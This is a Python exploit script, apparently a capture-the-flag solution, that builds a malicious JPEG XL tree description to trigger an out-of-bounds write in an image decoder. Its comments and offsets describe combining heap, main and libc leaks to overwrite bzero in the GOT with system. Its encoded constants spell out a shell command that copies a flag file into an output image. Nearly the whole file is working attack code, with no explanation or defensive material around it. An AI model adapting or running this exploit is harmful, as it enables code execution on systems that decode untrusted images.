#! /usr/bin/env python3

import sys

# The flow of the exploit:
# - We have a leak from the heap. We will add an offset from that to the buffer we are oob on
# - We have a leak of main's address. We will subtract an offset from it get our target overwrite
# - We have a leak from system, we will add an offset to this to get system
# - We then subtract the target from our buffer and divide by 2 to get the offset to write OOB
# - We use that to overwrite bzero in @got with system

TRIGGER = True

OFF_ONE = 0x74400 # main -> target write in @got
OFF_ONE_0 = hex(OFF_ONE & 0xff)
OFF_ONE_1 = hex((OFF_ONE >> 8) & 0xff)
OFF_ONE_2 = hex((OFF_ONE >> 16) & 0xff)
OFF_ONE_3 = hex((OFF_ONE >> 24) & 0xff)

OFF_TWO = 0x8fe0 # heap leak -> oob buffer
OFF_TWO_0 = hex(OFF_TWO & 0xff)
OFF_TWO_1 = hex((OFF_TWO >> 8) & 0xff)
OFF_TWO_2 = hex((OFF_TWO >> 16) & 0xff)
OFF_TWO_3 = hex((OFF_TWO >> 24) & 0xff)

OFF_THREE = 0x54f00 # @malloc in libc -> system
OFF_THREE_0 = hex(OFF_THREE & 0xff)
OFF_THREE_1 = hex((OFF_THREE >> 8) & 0xff)
OFF_THREE_2 = hex((OFF_THREE >> 16) & 0xff)
OFF_THREE_3 = hex((OFF_THREE >> 24) & 0xff)

OFF_FOUR = -(OFF_TWO // 2) # RDI on crash

plan = f'''
0	E	E	E	E				0	E	E	E	E					E	E	E	E	E	E					
	Trunc	Trunc	Trunc	Trunc	W + {OFF_ONE_3}	W			Trunc	Trunc	Trunc	Trunc	W + {OFF_TWO_3}	W			Trunc	Trunc	Trunc	Trunc	Trunc	Trunc	W	W	W		
NE + {OFF_ONE_0}		N + {OFF_ONE_1}	N + {OFF_ONE_2}			N		NE + {OFF_TWO_0}		N + {OFF_TWO_1}	N + {OFF_TWO_2}			N		NE - {OFF_THREE_0}		N - {OFF_THREE_1}	N - {OFF_THREE_2}	N - {OFF_THREE_3}	N				N		
N		N	N	W		N		N		N	N	W		N		N		N	N	N	N	W	W		N		
N		N		N	0x100	N*W		N		N		N	0x100	N*W		N		N	N	N			N		N		
N	0x100	N*W	0x10000	N*W	0x10000	N*W		N	0x100	N*W	0x10000	N*W	0x10000	N*W		N		N	N	N	W	W	N		N		
N	0	N	0	N	0	N		N	0	N	0	N	0	N		N	0x100	N*W	N	W	0x100	N*W	N	0x100	N*W		
N	W	N+W-NW	W	N+W-NW	W	N+W-NW		N	W	N+W-NW	W	N+W-NW	W	N+W-NW	W	N	0	N		N	0	N	N	0	N		
	{OFF_FOUR + 0}		{OFF_FOUR + 1}		{OFF_FOUR + 2}	N	W	W	W	W	W	W	W	W	N	N	W	N+W-NW		N	W	N+W-NW	N	W	N+W-NW		
0x6163	SavePallet	0x2074	SavePallet	0x662f	SavePallet	0	{OFF_FOUR + 3}		{OFF_FOUR + 4}		{OFF_FOUR + 5}		{OFF_FOUR + 6}	N	N	0	0	N				N			N		
	{OFF_FOUR + 7}		{OFF_FOUR + 8}			0x616c	SavePallet	0x3e2a	SavePallet	0x756f	SavePallet	0x2e74	SavePallet	N	W	N+W-NW	AvgW+N	N	WW	W + 1	W	N	WW	W + 1	N	WW	
0x6e70	SavePallet	0x67	SavePallet	0														N	SavePallet	0		N	SavePallet	0	N	SavePallet	0
'''

# example of the data that is in the pixel buffer
# we can use the E opcodes to load those into our normal pixel values
#  66c50b005055000000000000000000005247422058595a2007e3000c0001000000000000616373704150504c0000000000000000000000000000000000000000

class JXLFactory(object):
    def __init__(self, width, height, plan):
        self.width = width
        self.height = height
        self.max_height = height
        self.x = 0
        self.y = 0
        self.plan = plan.strip().split('\n')
        self.plan_offset = 8 + 8 - 2
        self.out = f'''
Width {self.width}
Height {self.height}
Bitdepth 8

if x > 200
- Weighted 2
'''

    def handle_row(self, row):
        print(f'row {row}', file=sys.stderr)
        plan_row = ''
        if row < len(self.plan):
            plan_row = self.plan[row].split('\t')

        change_list = []

        last_type = None
        for i,c in enumerate(plan_row):
            i += self.plan_offset
            if not c:
                continue
            if c == last_type:
                continue
            change_list.append((i, c, []))
            last_type = c

        has_ifs = False

        print(change_list, file=sys.stderr)
        for i,c,args in reversed(change_list):
            if i > 0:
                self.out += f'  if x > {i - 1}\n'
                has_ifs = True

            offset = 0

            if ' + ' in c:
                c, val = c.split(' + ', 1)
                val = int(val, 0)
                offset = val
            if ' - ' in c:
                c, val = c.split(' - ', 1)
                val = int(val, 0)
                offset = -val

            if c == 'E':
                self.out += f'    - E {offset}\n'
            elif c == 'N':
                self.out += f'    - N {offset}\n'
            elif c == 'W':
                self.out += f'    - W {offset}\n'
            elif c == 'S':
                self.out += f'    - S {offset}\n'
            elif c == 'NW':
                self.out += f'    - NW {offset}\n'
            elif c == 'NE':
                self.out += f'    - NE {offset}\n'
            elif c == 'WW':
                self.out += f'    - WW {offset}\n'
            elif c == 'N+W-NW':
                self.out += f'    - N+W-NW {offset}\n'
            elif c == 'N*W':
                self.out += f'    - N*W {offset}\n'
            elif c == 'AvgW+N':
                self.out += f'    - AvgW+N {offset}\n'
            elif c == 'SavePallet':
                self.out += f'    if c > 0\n'
                self.out += f'      - Set 0\n'
                if TRIGGER:
                    self.out += f'      - SavePallet {offset}\n'
                else:
                    self.out += f'      - S {offset}\n'
            elif c == 'Trunc':
                self.out += f'    - Trunc {offset}\n'
            else:
                try:
                    val = int(c, 0)
                    self.out += f'    - Set {val}\n'
                except ValueError:
                    raise Exception(f'Unknown value {c}')

        if len(change_list) == 0:
            self.out += f'  - Set {row}\n'
        elif has_ifs:
            # default case
            self.out += f'  - Set {row}\n'

    def render_all(self):
        for y in range(self.max_height, -1, -1):
            if y > 0:
                self.out += f'if y > {y - 1}\n'
            self.handle_row(y)

        # default case
        self.out += f'- Set 65536\n'

    def get_output(self):
        return self.out



if __name__ == '__main__':
    jxl = JXLFactory(48, 13, plan)
    jxl.render_all()
    print(jxl.get_output())
